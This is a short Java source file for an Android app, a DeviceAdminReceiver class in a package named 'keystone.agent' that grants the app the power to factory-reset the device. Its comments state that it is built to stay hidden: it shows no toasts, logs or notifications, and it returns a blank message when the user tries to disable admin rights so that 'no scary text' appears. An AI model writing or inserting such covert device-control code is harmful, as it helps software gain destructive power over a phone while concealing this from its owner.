// language: Java, file: AgentAdmin.java, target: Android 8+
// Device Admin receiver — gives the app power to factory reset
package com.keystone.agent;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AgentAdmin extends DeviceAdminReceiver {
    // Silent — no toasts, no logs, no notifications
    @Override public void onEnabled(Context ctx, Intent i) {}
    @Override public void onDisabled(Context ctx, Intent i) {}
    @Override public CharSequence onDisableRequested(Context ctx, Intent i) {
        return ""; // blank message — no scary text shown
    }
}
